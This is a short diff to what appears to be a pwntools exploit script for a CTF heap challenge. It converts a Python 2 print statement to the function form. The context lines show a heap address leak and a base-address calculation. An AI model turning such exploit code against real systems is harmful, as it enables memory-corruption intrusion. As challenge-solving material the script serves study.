@@ -1,6 +1,7 @@
 #!/usr/bin/env python2.7
 # -*- coding: utf-8 -*-
 
+from __future__ import print_function
 from pwn import *
 from ctypes import c_uint32
 
@@ -84,7 +85,7 @@ add(0x400, '0'*0x400)
 # leak
 show(0xb)
 io.recvuntil('num: ')
-print hex(c_uint32(int(io.recvline()[:-1])).value)
+print(hex(c_uint32(int(io.recvline()[:-1])).value))
 
 io.recvuntil('description:')
 HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
